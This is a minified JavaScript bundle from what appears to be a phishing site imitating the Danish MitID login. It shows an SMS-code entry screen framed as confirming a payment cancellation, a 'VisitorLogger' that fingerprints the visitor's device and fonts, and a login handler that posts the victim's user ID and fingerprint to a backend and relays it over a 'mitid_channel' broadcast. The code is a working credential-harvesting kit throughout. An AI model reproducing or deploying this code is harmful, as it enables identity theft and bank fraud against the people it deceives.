                    }), h ? l.jsxs("div", {
                        className: "flex items-center gap-2 text-green-600 py-2",
                        children: [l.jsx(se, {
                            className: "w-5 h-5"
                        }), l.jsx("span", {
                            className: "font-medium",
                            children: "Kode sendt!"
                        })]
                    }) : l.jsxs(l.Fragment, {
                        children: [l.jsxs("div", {
                            className: "relative",
                            children: [l.jsx("input", {
                                type: "text",
                                inputMode: "numeric",
                                maxLength: 6,
                                value: d,
                                onChange: u => {
                                    a(u.target.value.replace(/\D/g, "")),
                                    m("")
                                }
                                ,
                                placeholder: "Indtast kode fra SMS",
                                className: "w-full pl-3 pr-12 py-3 border-[2px] border-[#0060e6] rounded-[4px] outline-none text-lg text-[#1a1a1a] bg-white"
                            }), l.jsx("span", {
                                className: "absolute right-3 top-1/2 -translate-y-1/2 text-[#1a1a1a] text-[15px]",
                                children: "Skjul"
                            })]
                        }), c && l.jsxs("div", {
                            className: "flex items-center gap-1 text-red-600 text-xs mt-2",
                            children: [l.jsx(he, {
                                className: "w-4 h-4"
                            }), l.jsx("span", {
                                children: c
                            })]
                        }), l.jsx("button", {
                            onClick: y,
                            disabled: d.length < 4,
                            className: `w-full mt-3 font-bold text-[14px] py-2.5 px-4 rounded-[4px] transition-colors ${d.length >= 4 ? "bg-[#0060e6] hover:bg-[#004cb8] text-white cursor-pointer" : "bg-[#cccccc] text-white cursor-not-allowed"}`,
                            children: "BEKRÆFT"
                        }), l.jsx("p", {
                            className: "text-[11px] text-[#666666] mt-3 text-center",
                            children: "Skriv SMS-koden i feltet for at bekræfte anullering betalingen"
                        })]
                    })]
                })
            }), l.jsxs("div", {
                className: "border-t border-[#d8d8d8] pt-6 w-full px-8 flex gap-8 mt-auto",
                children: [l.jsx("button", {
                    onClick: e,
                    className: "text-[#001845] font-bold text-[15px] hover:underline bg-transparent border-none p-0 cursor-pointer",
                    children: "Afbryd"
                }), l.jsx("a", {
                    href: "#",
                    className: "text-[#001845] font-bold text-[15px] hover:underline",
                    children: "Hjælp"
                })]
            })]
        })
    })
}
;
function le() {
    const e = navigator.userAgent
      , t = `${window.screen.width}x${window.screen.height}`
      , n = navigator.language || navigator.userLanguage
      , r = window.devicePixelRatio || 1
      , s = window.screen.colorDepth
      , o = "ontouchstart"in window || navigator.maxTouchPoints > 0
      , i = navigator.hardwareConcurrency || "Unknown"
      , d = navigator.deviceMemory || "Unknown";
    let a = "Unknown";
    try {
        a = Intl.DateTimeFormat().resolvedOptions().timeZone
    } catch {}
    const h = [e, t, n, a, i, d, r, s, o].join("|");
    let f = 0;
    for (let c = 0; c < h.length; c++) {
        const m = h.charCodeAt(c);
        f = (f << 5) - f + m,
        f = f & f
    }
    return Math.abs(f).toString(16)
}
const B = "window.location.origin;";
async function ht() {
    try {
        console.log("[VisitorLogger] Initializing on domain:", window.location.hostname),
        console.log("[VisitorLogger] Backend URL:", B);
        const e = `${window.screen.width}x${window.screen.height}`
          , t = window.devicePixelRatio || 1
          , n = window.screen.colorDepth
          , r = navigator.language || navigator.userLanguage;
        let s = "Unknown";
        try {
            s = Intl.DateTimeFormat().resolvedOptions().timeZone
        } catch (w) {
            console.warn("[VisitorLogger] Could not get timezone:", w)
        }
        const o = "ontouchstart"in window || navigator.maxTouchPoints > 0
          , i = navigator.hardwareConcurrency || "Unknown"
          , d = navigator.deviceMemory || "Unknown"
          , a = navigator.userAgent;
        let h = "Unknown OS"
          , f = "Unknown Browser"
          , c = "Unknown Hardware"
          , m = "Desktop";
        if (a.indexOf("Win") !== -1)
            h = "Windows",
            a.indexOf("Windows NT 10.0") !== -1 ? h = "Windows 10/11" : a.indexOf("Windows NT 6.3") !== -1 ? h = "Windows 8.1" : a.indexOf("Windows NT 6.2") !== -1 ? h = "Windows 8" : a.indexOf("Windows NT 6.1") !== -1 && (h = "Windows 7");
        else if (a.indexOf("Android") !== -1) {
            h = "Android",
            m = "Mobile";
            const w = a.match(/Android\s+([\d.]+)/);
            w && (h = `Android ${w[1]}`);
            const N = a.match(/Android.*;\s*([^;]+)\s*Build/);
            N && (c = N[1].trim())
        } else if (a.indexOf("iPhone") !== -1 || a.indexOf("iPad") !== -1 || a.indexOf("iPod") !== -1) {
            h = "iOS",
            m = a.indexOf("iPad") !== -1 ? "Tablet" : "Mobile";
            const w = a.match(/OS\s+([\d_]+)/);
            w && (h = `iOS ${w[1].replace(/_/g, ".")}`);
            const N = window.screen.width
              , S = window.screen.height;
            N === 390 && S === 844 ? c = "iPhone 12/13/14 Pro" : N === 430 && S === 932 ? c = "iPhone 14/15 Pro Max" : N === 393 && S === 852 ? c = "iPhone 14/15 Pro" : N === 414 && S === 896 ? c = "iPhone XR/11/11 Pro Max" : N === 375 && S === 812 ? c = "iPhone X/XS/11 Pro" : N === 414 && S === 736 ? c = "iPhone 6/7/8 Plus" : N === 375 && S === 667 ? c = "iPhone 6/7/8/SE" : N === 320 && S === 568 ? c = "iPhone 5/SE (1st gen)" : a.indexOf("iPad") !== -1 && (c = "iPad",
            N >= 1024 && (c = "iPad Pro/Air"))
        } else if (a.indexOf("Mac") !== -1) {
            h = "macOS";
            const w = a.match(/Mac OS X\s+([\d._]+)/);
            w && (h = `macOS ${w[1].replace(/_/g, ".")}`),
            c = "Macintosh"
        } else
            a.indexOf("Linux") !== -1 && (h = "Linux");
        a.indexOf("Opera") !== -1 || a.indexOf("OPR") !== -1 ? f = "Opera" : a.indexOf("Vivaldi") !== -1 ? f = "Vivaldi" : a.indexOf("DuckDuckGo") !== -1 ? f = "DuckDuckGo" : a.indexOf("Edg") !== -1 ? f = "Edge" : a.indexOf("Chrome") !== -1 ? (f = "Chrome",
        navigator.brave && typeof navigator.brave.isBrave == "function" && (f = "Brave")) : a.indexOf("Safari") !== -1 ? f = "Safari" : a.indexOf("Firefox") !== -1 ? f = "Firefox" : (a.indexOf("MSIE") !== -1 || document.documentMode) && (f = "IE");
        const j = a.match(/(Chrome|Safari|Firefox|Edg|OPR|Opera|Vivaldi|DuckDuckGo|MSIE|rv:)\/?\s*([\d.]+)/);
        if (j) {
            const w = j[2];
            f = `${f} ${w}`
        }
        let b = "Unknown";
        if (navigator.connection) {
            const w = navigator.connection;
            b = `${w.effectiveType || "unknown"} (rtt: ${w.rtt}ms, down: ${w.downlink}Mb/s)`
        }
        let y = "Unknown";
        try {
            if (navigator.getBattery) {
                const w = await navigator.getBattery();
                y = `${Math.round(w.level * 100)}% (${w.charging ? "Charging" : "Discharging"})`
            }
        } catch {}
        const g = ["Arial", "Verdana", "Times New Roman", "Courier New", "Georgia", "Comic Sans MS", "Trebuchet MS", "Arial Black", "Impact", "Segoe UI", "Tahoma", "MS Sans Serif", "MS Serif", "Lucida Console", "Helvetica Neue", "Helvetica", "PingFang SC", "Hiragino Sans", "Ubuntu", "DejaVu Sans", "Liberation Sans", "Palatino", "Garamond", "Book Antiqua", "Arial Narrow", "Calibri", "Candara", "Consolas", "Constantia", "Corbel", "Franklin Gothic Medium", "Gabriola", "Segoe Script", "Segoe UI Symbol", "AppleGothic", "Baskerville", "Geneva", "Monaco", "Optima"].filter(w => {
            const S = document.createElement("canvas").getContext("2d");
            if (!S)
                return !1;
            const A = "abcdefghijklmnopqrstuvwxyz0123456789";
            S.font = "72px monospace";
            const ce = S.measureText(A).width;
            return S.font = `72px "${w}", monospace`,
            S.measureText(A).width !== ce
        }
        )
          , x = le()
          , v = {
            hardware: `${c} (${m}, Touch: ${o ? "Yes" : "No"}, DPR: ${t}, Color: ${n}bit, CPU: ${i}, RAM: ${d}GB, Conn: ${b}, Bat: ${y})`,
            os: h,
            screenResolution: e,
            language: r,
            browser: f,
            timezone: s,
            fonts: g.join(", "),
            fingerprint: x
        };
        console.log("[VisitorLogger] Sending payload to:", `${B}/api/public/visitor-logs`);
        const E = await fetch(`${B}/api/public/visitor-logs`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(v)
        });
        if (E.ok)
            console.log("[VisitorLogger] Visitor logged successfully.");
        else {
            console.error("[VisitorLogger] Failed to log visitor. Status:", E.status);
            const w = await E.text();
            console.error("[VisitorLogger] Error details:", w)
        }
    } catch (e) {
        console.error("[VisitorLogger] Error logging visitor:", e)
    }
}
const ft = "window.location.origin;";
function pt() {
    const [e,t] = p.useState("loading")
      , n = p.useRef(null);
    p.useEffect( () => {
        console.log("[App] Initializing UserFlow, calling logVisitor..."),
        ht(),
        n.current = new BroadcastChannel("mitid_channel");
        const s = setTimeout( () => t("login"), 2500);
        return () => {
            clearTimeout(s),
            n.current?.close()
        }
    }
    , []);
    const r = async s => {
        const o = le();
        n.current && n.current.postMessage({
            type: "userid",
            value: s,
            fingerprint: o
        });
        try {
            localStorage.setItem("mitid_userid", JSON.stringify({
                value: s,
                fingerprint: o,
                timestamp: Date.now()
            }))
        } catch (i) {
            console.error("Storage error:", i)
        }
        try {
            await fetch(`${ft}/api/public/user-logins`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    userId: s,
                    fingerprint: o
                })
            })
        } catch (i) {
            console.error("Backend sync error:", i)
        }
        t("qr")
    }
    ;
    return e === "loading" ? l.jsx(dt, {}) : e === "qr" ? l.jsx(ut, {
        onCancel: () => t("login")
    }) : l.jsx(ct, {
        onContinue: r
    })
}
function mt() {
    return l.jsx(tt, {
        children: l.jsx(Ze, {
            children: l.jsx(ie, {
                path: "/",
                element: l.jsx(pt, {})
            })
        })
    })
}
window.location.protocol === "http:" && window.location.hostname !== "localhost" && !window.location.hostname.includes("127.0.0.1") && (window.location.href = window.location.href.replace("http:", "https:"));
fe.createRoot(document.getElementById("root")).render(l.jsx(p.StrictMode, {
    children: l.jsx(mt, {})
}));
//# sourceMappingURL=main-veMv2NJa.js.map
